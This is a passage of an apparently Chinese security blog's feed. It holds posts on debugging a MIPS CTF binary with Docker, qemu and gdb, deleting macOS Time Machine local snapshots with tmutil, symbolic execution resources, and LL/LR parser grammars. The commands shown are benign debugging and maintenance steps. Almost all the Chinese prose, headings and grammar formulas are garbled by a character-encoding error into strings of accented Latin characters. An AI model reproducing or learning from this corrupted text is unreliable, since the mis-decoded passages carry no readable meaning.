<h4 id="0x03-ä½¿ç”¨è¿‡ç¨‹"><a href="#0x03-ä½¿ç”¨è¿‡ç¨‹" class="headerlink" title="0x03 : ä½¿ç”¨è¿‡ç¨‹"></a>0x03 : ä½¿ç”¨è¿‡ç¨‹</h4><h5 id="1-è·å–æ‰€éœ€é•œåƒ"><a href="#1-è·å–æ‰€éœ€é•œåƒ" class="headerlink" title="1. è·å–æ‰€éœ€é•œåƒ"></a>1. è·å–æ‰€éœ€é•œåƒ</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull skysider/multiarch-docker</span><br></pre></td></tr></table></figure>
<h5 id="2-å¯åŠ¨"><a href="#2-å¯åŠ¨" class="headerlink" title="2. å¯åŠ¨"></a>2. å¯åŠ¨</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ docker run -it \</span><br><span class="line">    --rm \</span><br><span class="line">    -h baby_mips \</span><br><span class="line">    --name baby_mips \</span><br><span class="line">    -v $(<span class="built_in">pwd</span>):/ctf/work \</span><br><span class="line">    -P \</span><br><span class="line">    --cap-add=SYS_PTRACE \</span><br><span class="line">    skysider/multiarch-docker</span><br></pre></td></tr></table></figure>
<h5 id="3-å¤åˆ¶æ–‡ä»¶"><a href="#3-å¤åˆ¶æ–‡ä»¶" class="headerlink" title="3. å¤åˆ¶æ–‡ä»¶"></a>3. å¤åˆ¶æ–‡ä»¶</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker cp ~/Downloads/baby_mips.dms 207187a8a24d:/tmp/</span><br></pre></td></tr></table></figure>
<h5 id="4-è°ƒè¯•"><a href="#4-è°ƒè¯•" class="headerlink" title="4. è°ƒè¯•"></a>4. è°ƒè¯•</h5><p>è¿™é‡Œéœ€è¦å¼€ä¸¤ä¸ªbashï¼Œåœ¨å¯åŠ¨å®¹å™¨çš„æ—¶å€™å·²ç»æœ‰ä¸€ä¸ªbahsäº†ï¼Œ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps <span class="_">-a</span></span><br></pre></td></tr></table></figure>
<p>çœ‹çœ‹å½“å‰è¿™ä¸ªå®¹å™¨çš„idï¼Œç„¶åï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it id /bin/bash</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°ä¸¤ä¸ªbashï¼Œä¸€ä¸ªè¿è¡Œç¨‹åºï¼Œä¸€ä¸ªgdbçª—å£ã€‚</p>
<p>è¿è¡Œç¨‹åºï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-mipsel -g 2333 ./demo</span><br></pre></td></tr></table></figure>
<p>gdbè°ƒè¯•ç«¯å£æ˜¯2333</p>
<p>gdbçª—å£ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch ./demo</span><br></pre></td></tr></table></figure>
<p>ç„¶ågdbé‡Œ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target remote localhost:2333</span><br></pre></td></tr></table></figure>
<p>gdbé‡Œå¥½åƒä¸ç”¨set archäº†ï¼Œpwngdbæ’ä»¶è‡ªåŠ¨è¯†åˆ«äº†å¥½åƒ å›§</p>
<h5 id="5-have-fun"><a href="#5-have-fun" class="headerlink" title="5. have fun"></a>5. have fun</h5><p>Enjoy your debug journey~</p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00-èµ·å› &quot;&gt;&lt;a href=&quot;#0x00-èµ·å› &quot; class=&quot;headerlink&quot; title=&quot;0x00 : èµ·å› &quot;&gt;&lt;/a&gt;0x00 : èµ·å› &lt;/h4&gt;&lt;p&gt;æ¯”èµ›é‡åˆ°äº†ï¼Œå¸®å­¦å¼ŸæŠ˜è…¾è°ƒè¯•ç¯å¢ƒï¼Œä¸­é—´è¸©å‘æ— æ•°ï¼Œä½†æ˜¯æœ€åè¿˜æ˜¯è§£å†³äº†ï¼Œå°±è®°å½•ä¸‹ã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="debug" scheme="http://o0xmuhe.me/tags/debug/"/>
    
      <category term="mips" scheme="http://o0xmuhe.me/tags/mips/"/>
    
  </entry>
  
  <entry>
    <title>æ‹¯æ•‘macOS High sierraçš„ç¡¬ç›˜ç©ºé—´</title>
    <link href="http://o0xmuhe.me/2018/03/14/%E6%8B%AF%E6%95%91macOS-High-sierra%E7%9A%84%E7%A1%AC%E7%9B%98%E7%A9%BA%E9%97%B4/"/>
    <id>http://o0xmuhe.me/2018/03/14/æ‹¯æ•‘macOS-High-sierraçš„ç¡¬ç›˜ç©ºé—´/</id>
    <published>2018-03-14T09:03:06.000Z</published>
    <updated>2018-03-14T09:14:21.355Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00-èµ·å› "><a href="#0x00-èµ·å› " class="headerlink" title="0x00 : èµ·å› "></a>0x00 : èµ·å› </h4><p>Macä¸€ç›´å¼€ç€time machineå¤‡ä»½æ•°æ®ï¼Œä¸€ç›´æ²¡å‡ºå•¥é—®é¢˜ã€‚<br>ç›´åˆ°ä»Šå¤©åœ¨å·¥ä½œçš„æ—¶å€™ï¼ŒåŸæœ¬cloneçš„ä¸€ä¸ªè™šæ‹Ÿæœºæœ‰é—®é¢˜ï¼Œæˆ‘å°±åˆ äº†ï¼Œé‡æ–°å…‹éš†ã€‚(æ²¡æœ‰å¿«ç…§çœŸçš„å°´å°¬äº†)</p>
<a id="more"></a>
<p>ç»“æœå‘ç°å…‹éš†ä¸äº†ï¼Œæç¤ºæˆ‘ç¡¬ç›˜ç©ºé—´ä¸è¶³ã€‚ :(<br>æˆ‘çœ‹äº†ä¸‹æœ¬æœºçš„ç¡¬ç›˜ï¼Œæ˜æ˜è¿˜æœ‰120g+å‘¢ï¼Œæ€ä¹ˆä¼šä¸è¶³å‘¢ã€‚</p>
<h4 id="0x01-é—®é¢˜æ‰€åœ¨"><a href="#0x01-é—®é¢˜æ‰€åœ¨" class="headerlink" title="0x01 : é—®é¢˜æ‰€åœ¨"></a>0x01 : é—®é¢˜æ‰€åœ¨</h4><p>æˆ‘ä½¿ç”¨äº†clean my macå„ç§æäº‹ã€æ¸…ç†ç©ºé—´ï¼Œç£ç›˜å‰©ä½™ç©ºé—´åˆ°äº†200gã€‚ã€‚ä½†æ˜¯æˆ‘å…‹éš†è¿˜æ˜¯å¤±è´¥ :(</p>
<p>äºæ˜¯æ‰“å¼€ç£ç›˜å·¥å…·æŸ¥çœ‹ï¼Œå‘ç°æœ‰150gç©ºé—´çš„ç©ºé—´æ˜¯å¯ä»¥æ¸…é™¤çš„ï¼Œå°±å¾ˆå¥½å¥‡å“ªæ¥çš„è¿™ä¹ˆå¤§çš„ç©ºé—´â€¦</p>
<p>çœ‹äº†Appleå®˜ç½‘ï¼Œè¯´æ˜¯å•¥æ–‡ä»¶å¯ä»¥å­˜iCloudï¼Œç„¶åä¸‹è½½çš„æ—¶å€™ç”¨ï¼Œå°±å¯ä»¥çœä¸‹æ¥ä¸€éƒ¨åˆ†ç©ºé—´ï¼Œå¯æ˜¯æˆ‘æƒ³äº†æƒ³ï¼Œè‚¯å®šä¸æ˜¯è¿™ä¸ªå•Šï¼Œæˆ‘iCloudä¸€å…±æ‰50gï¼Œè€Œä¸”æ‰ç”¨äº†ä¸€åŠï¼Œè¿™150gè‚¯å®šä¸å¯¹ã€‚</p>
<p>åæ¥åœ¨<a href="https://www.v2ex.com/t/389533" target="_blank" rel="noopener">v2ex</a>çœ‹åˆ°äº†æ­£è§£ã€‚</p>
<p>è¿™æ˜¯å‡çº§äº†10.13åçš„time machineæçš„äº‹ï¼Œä»–æœ‰è‡ªåŠ¨æœ¬åœ°å¤‡ä»½ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å½“ TM æ‰“å¼€åï¼Œå¦‚æœå¤‡ä»½ä»‹è´¨ä¸å¯ç”¨ï¼Œé‚£ä¹ˆ TM ä¸ä¼šåœæ­¢å·¥ä½œï¼Œå®ƒä¾ç„¶ä¼šç›‘æ§ç³»ç»Ÿçš„è¿è¡Œï¼Œå¹¶å»ºç«‹æœ¬åœ°å¿«ç…§ï¼Œä»¥è¾¾æˆ TM çš„å¤‡ä»½åŠŸèƒ½ï¼Œæ¯”å¦‚å¦‚æœä½ åœ¨æ­¤æ—¶ä¸å°å¿ƒåˆ é™¤äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œé‚£ä¹ˆä¾ç„¶å¯ä»¥ä» TM ä¸­å°†å®ƒæ¢å¤ï¼Œè¿™æ˜¯ä¸€ä¸ªä¸é”™çš„åŠŸèƒ½ã€‚ä¸€æ—¦ä½ çš„å¤‡ä»½ä»‹è´¨å¯ç”¨ï¼Œå®ƒä¼šè‡ªåŠ¨å°†å¿«ç…§ç§»åˆ°ï¼ˆä¸æ˜¯å¤‡ä»½ï¼Œæ˜¯ç§»åŠ¨ï¼‰å¤‡ä»½ä»‹è´¨ä¸­ï¼Œä»¥é‡Šæ”¾æœ¬åœ°ç©ºé—´ï¼›è€Œä¸”å®ƒä¼šä¾ç…§å½“å‰ç³»ç»Ÿåˆ†åŒºçš„ä½¿ç”¨æƒ…å†µæ¥ç¡®è®¤è‡ªå·±å»ºç«‹æœ¬åœ°å¿«ç…§çš„è¡Œä¸ºï¼Œç®€å•è¯´å°±æ˜¯å½“æœ¬åœ°ç©ºé—²ç©ºé—´è¿‡å°‘æ—¶ï¼Œå®ƒä¼šé…Œæƒ…åˆ é™¤æ—§çš„æœ¬åœ°å¿«ç…§ã€‚</span><br></pre></td></tr></table></figure>
<p>å¤§æ¦‚å°±æ˜¯è¿™æ ·çš„æƒ…å†µã€‚</p>
<h4 id="0x02-è§£å†³"><a href="#0x02-è§£å†³" class="headerlink" title="0x02 : è§£å†³"></a>0x02 : è§£å†³</h4><h6 id="1-å…³é—­æœ¬åœ°å¤‡ä»½"><a href="#1-å…³é—­æœ¬åœ°å¤‡ä»½" class="headerlink" title="1. å…³é—­æœ¬åœ°å¤‡ä»½"></a>1. å…³é—­æœ¬åœ°å¤‡ä»½</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tmutil disablelocal</span><br></pre></td></tr></table></figure>
<p>ä½†æ˜¯æˆ‘å‘ç°è¿™ä¸ªå‘½ä»¤å·²ç»æ²¡äº†ï¼Œå¥½åƒæ˜¯è¢«ç§»é™¤äº†ã€‚</p>
<h6 id="2-åˆ é™¤æœ¬åœ°å¤‡ä»½"><a href="#2-åˆ é™¤æœ¬åœ°å¤‡ä»½" class="headerlink" title="2. åˆ é™¤æœ¬åœ°å¤‡ä»½"></a>2. åˆ é™¤æœ¬åœ°å¤‡ä»½</h6><p>åªèƒ½å…ˆç”¨<code>tmutil listlocalsnapshots [mount]</code>æ‰¾æœ¬åœ°å¤‡ä»½ï¼Œç„¶åä½¿ç”¨<code>tmutil deletelocalsnapshots YYYY-MM-DD-HHMMSS</code> æ¥åˆ é™¤ã€‚<br>ä¸‹é¢æ˜¯æˆ‘çš„æµ‹è¯•â€¦</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># muhe @ muheMacBookPro in ~ [17:00:12] C:64</span></span><br><span class="line">$ tmutil listlocalsnapshots</span><br><span class="line">Usage: tmutil listlocalsnapshots &lt;mount_point&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># muhe @ muheMacBookPro in ~ [17:00:25] C:64</span></span><br><span class="line">$ tmutil listlocalsnapshots /</span><br><span class="line">com.apple.TimeMachine.2018-03-09-011841</span><br><span class="line">com.apple.TimeMachine.2018-03-13-181325</span><br><span class="line">com.apple.TimeMachine.2018-03-13-191609</span><br><span class="line">com.apple.TimeMachine.2018-03-13-202018</span><br><span class="line">com.apple.TimeMachine.2018-03-13-211538</span><br><span class="line">com.apple.TimeMachine.2018-03-13-221327</span><br><span class="line">com.apple.TimeMachine.2018-03-14-001309</span><br><span class="line">com.apple.TimeMachine.2018-03-14-012200</span><br><span class="line">com.apple.TimeMachine.2018-03-14-030328</span><br><span class="line">com.apple.TimeMachine.2018-03-14-050253</span><br><span class="line">com.apple.TimeMachine.2018-03-14-064523</span><br><span class="line">com.apple.TimeMachine.2018-03-14-104506</span><br><span class="line">com.apple.TimeMachine.2018-03-14-115132</span><br><span class="line">com.apple.TimeMachine.2018-03-14-142419</span><br><span class="line">com.apple.TimeMachine.2018-03-14-152240</span><br><span class="line">com.apple.TimeMachine.2018-03-14-162236</span><br><span class="line">com.apple.TimeMachine.2018-03-14-163225</span><br><span class="line"></span><br><span class="line"><span class="comment"># muhe @ muheMacBookPro in ~ [17:00:32]</span></span><br><span class="line">$ tmutil deletelocalsnapshots 2018-03-09-011841</span><br><span class="line">Deleted <span class="built_in">local</span> snapshot <span class="string">'2018-03-09-011841'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># muhe @ muheMacBookPro in ~ [17:01:12]</span></span><br><span class="line">$ tmutil deletelocalsnapshots 2018-03-13-181325</span><br><span class="line">Deleted <span class="built_in">local</span> snapshot <span class="string">'2018-03-13-181325'</span></span><br></pre></td></tr></table></figure>
<h4 id="0x03-å‚è€ƒ"><a href="#0x03-å‚è€ƒ" class="headerlink" title="0x03 : å‚è€ƒ"></a>0x03 : å‚è€ƒ</h4><p><a href="https://www.v2ex.com/t/389533" target="_blank" rel="noopener">10.13 å‡çº§åï¼Œå¤šå‡ºäº†å¾ˆå¤§ä¸€å—éšè—ç©ºé—´ï¼Œä¸èƒ½ç”¨ä¹Ÿåˆ é™¤ä¸äº†ï¼Ÿâ€“ v2ex</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00-èµ·å› &quot;&gt;&lt;a href=&quot;#0x00-èµ·å› &quot; class=&quot;headerlink&quot; title=&quot;0x00 : èµ·å› &quot;&gt;&lt;/a&gt;0x00 : èµ·å› &lt;/h4&gt;&lt;p&gt;Macä¸€ç›´å¼€ç€time machineå¤‡ä»½æ•°æ®ï¼Œä¸€ç›´æ²¡å‡ºå•¥é—®é¢˜ã€‚&lt;br&gt;ç›´åˆ°ä»Šå¤©åœ¨å·¥ä½œçš„æ—¶å€™ï¼ŒåŸæœ¬cloneçš„ä¸€ä¸ªè™šæ‹Ÿæœºæœ‰é—®é¢˜ï¼Œæˆ‘å°±åˆ äº†ï¼Œé‡æ–°å…‹éš†ã€‚(æ²¡æœ‰å¿«ç…§çœŸçš„å°´å°¬äº†)&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Symbolic Executionå­¦ä¹ </title>
    <link href="http://o0xmuhe.me/2018/02/16/Symbolic-Execution%E5%AD%A6%E4%B9%A0/"/>
    <id>http://o0xmuhe.me/2018/02/16/Symbolic-Executionå­¦ä¹ /</id>
    <published>2018-02-16T09:36:48.000Z</published>
    <updated>2018-04-25T14:50:02.974Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00: å‰è¨€"></a>0x00: å‰è¨€</h4><p>å­¦ä¹ çš„æ—¶å€™åšä¸ªè®°å½•ï¼Œçœ‹è¿‡ä»€ä¹ˆï¼Œè¸©è¿‡ä»€ä¹ˆå‘ä¹‹ç±»çš„(æ›´æ–°ä¸­â€¦)</p>
<a id="more"></a>
<h4 id="0x01-èµ„æ–™"><a href="#0x01-èµ„æ–™" class="headerlink" title="0x01: èµ„æ–™"></a>0x01: èµ„æ–™</h4><h5 id="1-paper-amp-amp-ä¸é”™çš„æ–‡ç« "><a href="#1-paper-amp-amp-ä¸é”™çš„æ–‡ç« " class="headerlink" title="1. paper &amp;&amp; ä¸é”™çš„æ–‡ç« "></a>1. paper &amp;&amp; ä¸é”™çš„æ–‡ç« </h5><p>ã€ŠAll You Ever Wanted to Know about Dynamic Taint Analysis and Forward Symbolic Execution (but Might Have Been Afraid to Ask)ã€‹</p>
<p>ã€ŠSymbolic execution for software testing: three decades laterã€‹</p>
<p><a href="https://zhuanlan.zhihu.com/p/26927127" target="_blank" rel="noopener">ç¬¦å·æ‰§è¡Œå…¥é—¨</a></p>
<h5 id="2-é¡¹ç›®"><a href="#2-é¡¹ç›®" class="headerlink" title="2. é¡¹ç›®"></a>2. é¡¹ç›®</h5><p><a href="https://github.com/chyyuu/symexe/blob/master/klee_document/klee_analysis.md" target="_blank" rel="noopener">KLEE</a></p>
<p><a href="https://github.com/Z3Prover/z3" target="_blank" rel="noopener">Z3</a></p>
<p><a href="https://github.com/angr" target="_blank" rel="noopener">Angr</a></p>
<h4 id="3-ä¸€äº›èµ„æº"><a href="#3-ä¸€äº›èµ„æº" class="headerlink" title="3. ä¸€äº›èµ„æº"></a>3. ä¸€äº›èµ„æº</h4><h5 id="3-1-z3"><a href="#3-1-z3" class="headerlink" title="3.1 z3"></a>3.1 z3</h5><p>ä¸»è¦æ˜¯è§£å†³ä¸€äº›CTFé¢˜ç›®ã€‚</p>
<ol>
<li><p><a href="https://zhuanlan.zhihu.com/p/30548907" target="_blank" rel="noopener">Z3ä¸€æŠŠæ¢­ï¼šç”¨çº¦æŸæ±‚è§£æå®šä¸€ç±»CTFé¢˜</a></p>
</li>
<li><p><a href="https://blog.csdn.net/s1054436218/article/details/78651075" target="_blank" rel="noopener">ä½¿ç”¨z3çº¦æŸå™¨è§£å†³CTFä¸­çš„é¢˜ç›®</a></p>
</li>
<li><p><a href="https://github.com/sam-b/z3-stuff/blob/master/a-bug-hunters-constraint-solver/README.md?1524556640719" target="_blank" rel="noopener">z3-stuf</a></p>
</li>
</ol>
<h5 id="3-2-angr"><a href="#3-2-angr" class="headerlink" title="3.2 angr"></a>3.2 angr</h5><ol>
<li><p><a href="https://github.com/angr/angr-doc" target="_blank" rel="noopener">angr-doc</a></p>
<p> ä½¿ç”¨angrè§£å†³ä¸€äº›ctfé¢˜ç›®ï¼Œè¿™éƒ¨åˆ†ç›´æ¥å‚è€ƒangr-docé‡Œçš„exampleså°±å¥½äº†ã€‚</p>
</li>
<li><p><a href="https://github.com/jakespringer/angr_ctf" target="_blank" rel="noopener">angr-ctf</a></p>
<p> å¾ˆå¥½çš„å…¥é—¨èµ„æ–™ï¼Œå„ç§åŸºç¡€ç”¨æ³•éƒ½æœ‰demoï¼Œæ³¨é‡Šå¾ˆå…¨é¢ï¼Œè·Ÿç€å­¦ä¹ å°±å¥½äº†ã€‚<br> ç¯å¢ƒå»ºè®®ï¼šLinux + virtualenv</p>
</li>
<li><p>å…³æ³¨å„å¤§ctfä¸­wp</p>
</li>
</ol>
<h5 id="4-å®è·µdemo"><a href="#4-å®è·µdemo" class="headerlink" title="4. å®è·µdemo"></a>4. å®è·µdemo</h5><h5 id="1-mini-mc"><a href="#1-mini-mc" class="headerlink" title="1. mini mc"></a>1. <a href="https://github.com/xiw/mini-mc" target="_blank" rel="noopener">mini mc</a></h5><p>This directory contains a â€œminimalâ€ implementation to demonstrate<br>the basic ideas of symbolic execution and concolic execution, using<br>Z3â€™s Python interface. </p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00-å‰è¨€&quot;&gt;&lt;a href=&quot;#0x00-å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;0x00: å‰è¨€&quot;&gt;&lt;/a&gt;0x00: å‰è¨€&lt;/h4&gt;&lt;p&gt;å­¦ä¹ çš„æ—¶å€™åšä¸ªè®°å½•ï¼Œçœ‹è¿‡ä»€ä¹ˆï¼Œè¸©è¿‡ä»€ä¹ˆå‘ä¹‹ç±»çš„(æ›´æ–°ä¸­â€¦)&lt;/p&gt;
    
    </summary>
    
    
      <category term="Study" scheme="http://o0xmuhe.me/tags/Study/"/>
    
      <category term="Symbolic Execution" scheme="http://o0xmuhe.me/tags/Symbolic-Execution/"/>
    
  </entry>
  
  <entry>
    <title>LL LR SLR LALRå‚»å‚»åˆ†ä¸æ¸…</title>
    <link href="http://o0xmuhe.me/2018/02/11/LL-LR-SLR-LALR%E5%82%BB%E5%82%BB%E5%88%86%E4%B8%8D%E6%B8%85/"/>
    <id>http://o0xmuhe.me/2018/02/11/LL-LR-SLR-LALRå‚»å‚»åˆ†ä¸æ¸…/</id>
    <published>2018-02-11T08:33:54.000Z</published>
    <updated>2018-02-11T09:03:49.166Z</updated>
    
    <content type="html"><![CDATA[<pre><code>æ’¸å…¬å¼€è¯¾çš„æ—¶å€™è¢«è¿™å‡ ä¸ªæ–‡æ³•ç»•æ™•äº†ã€‚æœäº†å¾ˆå¤šä¸œè¥¿ï¼Œåˆå¹¶æ•´ç†æ–¹ä¾¿åç»­æŸ¥çœ‹ã€‚
</code></pre><a id="more"></a>
<h4 id="0x01-æ¦‚å¿µ"><a href="#0x01-æ¦‚å¿µ" class="headerlink" title="0x01: æ¦‚å¿µ"></a>0x01: æ¦‚å¿µ</h4><p>  é¦–å…ˆï¼ŒLLæ–‡æ³•æ˜¯è‡ªé¡¶å‘ä¸‹ï¼Œç”¨çš„æ˜¯æ¨å¯¼ï¼›LRã€SLRã€LALRæ˜¯è‡ªåº•å‘ä¸Šï¼Œç”¨çš„æ˜¯è§„çº¦ã€‚</p>
<h5 id="1-LL-1"><a href="#1-LL-1" class="headerlink" title="1. LL(1)"></a>1. LL(1)</h5><p>ç¬¬ä¸€ä¸ªLä»£è¡¨ä»å·¦å‘å³æ‰«æè¾“å…¥ç¬¦å·ä¸²ï¼Œç¬¬äºŒä¸ªLä»£è¡¨äº§ç”Ÿæœ€å·¦æ¨å¯¼ï¼Œ1ä»£è¡¨åœ¨åˆ†æè¿‡ç¨‹ä¸­æ‰§è¡Œæ¯ä¸€æ­¥æ¨å¯¼éƒ½è¦å‘å‰æŸ¥çœ‹ä¸€ä¸ªè¾“å…¥ç¬¦å·â€”â€”å½“å‰æ­£åœ¨å¤„ç†çš„è¾“å…¥ç¬¦å·ã€‚<br>é¾™ä¹¦ä¸Šçš„åˆ¤æ–­è§„åˆ™æ˜¯ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å½¢å¦‚ A-&gt;a|Î² è¿™æ ·çš„æ–‡æ³•ï¼Œæ»¡ è¶³</span><br><span class="line">        â‘ FIRST(Î±)âˆ© FIRST (Î² ) =Î¦</span><br><span class="line">        â‘¡è‹¥Îµâˆˆ FIRST( Î±)ï¼Œ è¦æ»¡è¶³ FIRST(Î²) âˆ©FOLLOW(A)=Î¦</span><br></pre></td></tr></table></figure>
<h5 id="2-LR-0"><a href="#2-LR-0" class="headerlink" title="2. LR(0)"></a>2. LR(0)</h5><p>å¦‚æœæŸä¸€æ–‡æ³•èƒ½å¤Ÿæ„é€ ä¸€å¼ åˆ†æè¡¨ï¼Œä½¿å¾—è¡¨ä¸­æ¯ä¸€ä¸ªå…ƒç´ è‡³å¤šåªæœ‰ä¸€ç§æ˜ç¡®åŠ¨ä½œï¼Œåˆ™è¯¥æ–‡æ³•ç§°ä¸ºLRæ–‡æ³•ã€‚</p>
<p>å…·ä½“æ¥è¯´ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1ã€æ„é€ å®ƒçš„LR(0)é¡¹ç›®é›†åˆçš„DFAï¼ˆå³è¯†åˆ«è¯¥æ–‡æ³•å…¨éƒ¨æ´»å‰ç¼€çš„DFAï¼‰ï¼›</span><br><span class="line">2ã€æ ¹æ®è¯¥DFAç”»å‡ºè¯¥æ–‡æ³•çš„LR(0)åˆ†æè¡¨ï¼›</span><br><span class="line">3ã€åœ¨åˆ†æè¡¨ä¸­ï¼Œæ¯æ ¼è¦ä¹ˆåªæœ‰ä¸€ä¸ªå†…å®¹ï¼Œè¦ä¹ˆæ²¡æœ‰å†…å®¹ï¼Œï¼ˆå³æ— å†²çªï¼‰åˆ™ä¸ºLR(0)æ–‡æ³•ã€‚</span><br></pre></td></tr></table></figure>
<p>æ¦‚æ‹¬ä¸€ä¸‹å°±æ˜¯ï¼šè§åˆ°Firsté›†å°±ç§»è¿›ï¼Œè§åˆ°ç»ˆæ€å°±å½’çº¦</p>
<h5 id="3-SLR-1"><a href="#3-SLR-1" class="headerlink" title="3. SLR(1)"></a>3. SLR(1)</h5><p>æ»¡è¶³ä¸‹é¢ä¸¤ä¸ªæ¡ä»¶çš„æ–‡æ³•æ˜¯SLR(1)æ–‡æ³•</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a.å¯¹äºåœ¨sä¸­çš„ä»»ä½•é¡¹ç›® Aâ†’Î±.XÎ²,å½“Xæ˜¯ä¸€ä¸ªç»ˆç»“ç¬¦ï¼Œä¸”Xåœ¨Follow(B)ä¸­æ—¶ï¼Œsä¸­æ²¡æœ‰å®Œæ•´çš„é¡¹ç›®Bâ†’r.</span><br><span class="line"></span><br><span class="line">b.å¯¹äºåœ¨sä¸­çš„ä»»ä½•ä¸¤ä¸ªå®Œæ•´é¡¹ç›®Aâ†’Î±.å’Œ Bâ†’Î².,Follow(A)âˆ©Follow(B)ä¸ºç©ºã€‚</span><br></pre></td></tr></table></figure>
<p>æ¦‚æ‹¬å°±æ˜¯ï¼šè§åˆ°Firsté›†å°±ç§»è¿›ï¼Œè§åˆ°ç»ˆæ€å…ˆçœ‹Followé›†ï¼Œä¸Followé›†å¯¹åº”çš„é¡¹ç›®å½’çº¦ï¼Œå…¶å®ƒæŠ¥é”™ã€‚</p>
<h5 id="4-LALR-1"><a href="#4-LALR-1" class="headerlink" title="4. LALR(1)"></a>4. LALR(1)</h5><p>LALRå³â€œLook-Ahead LRâ€ã€‚å…¶ä¸­ï¼ŒLook-Aheadä¸ºâ€œå‘å‰çœ‹â€ï¼ŒLä»£è¡¨å¯¹è¾“å…¥è¿›è¡Œä»å·¦åˆ°å³çš„æ£€æŸ¥ï¼ŒRä»£è¡¨åå‘æ„é€ å‡ºæœ€å³æ¨å¯¼åºåˆ—ã€‚</p>
<h5 id="5-LR-1"><a href="#5-LR-1" class="headerlink" title="5. LR(1)"></a>5. LR(1)</h5><p>å’ŒLR(0)ä¸€è‡´ï¼Œåªæ˜¯æ„é€ è‡ªåŠ¨æœºçš„æ—¶å€™å¤šå‘å‰æŸ¥çœ‹ä¸€ä¸ªå­—ç¬¦ã€‚</p>
<h4 id="0x02-å…³ç³»ä¸å¯¹æ¯”"><a href="#0x02-å…³ç³»ä¸å¯¹æ¯”" class="headerlink" title="0x02: å…³ç³»ä¸å¯¹æ¯”"></a>0x02: å…³ç³»ä¸å¯¹æ¯”</h4><h5 id="1-SLR-1-ä¸LR-0-çš„å…³ç³»ï¼š"><a href="#1-SLR-1-ä¸LR-0-çš„å…³ç³»ï¼š" class="headerlink" title="1. SLR(1)ä¸LR(0)çš„å…³ç³»ï¼š"></a>1. SLR(1)ä¸LR(0)çš„å…³ç³»ï¼š</h5><p>SLR(1)ä¸LR(0)ï¼šç®€å•çš„LRè¯­æ³•åˆ†ææŠ€æœ¯ï¼ˆå³SLRï¼ˆ1ï¼‰åˆ†ææŠ€æœ¯ï¼‰çš„ä¸­å¿ƒæ€æƒ³æ˜¯æ ¹æ®æ–‡æ³•æ„é€ å‡ºLRï¼ˆ0ï¼‰è‡ªåŠ¨æœºã€‚</p>
<ul>
<li><p>LR(0):è§åˆ°Firsté›†å°±ç§»è¿›ï¼Œè§åˆ°ç»ˆæ€å°±å½’çº¦</p>
</li>
<li><p>SLR(1)è§åˆ°Firsté›†å°±ç§»è¿›ï¼Œè§åˆ°ç»ˆæ€å…ˆçœ‹Followé›†ï¼Œä¸Followé›†å¯¹åº”çš„é¡¹ç›®å½’çº¦ï¼Œå…¶å®ƒæŠ¥é”™ã€‚</p>
</li>
</ul>
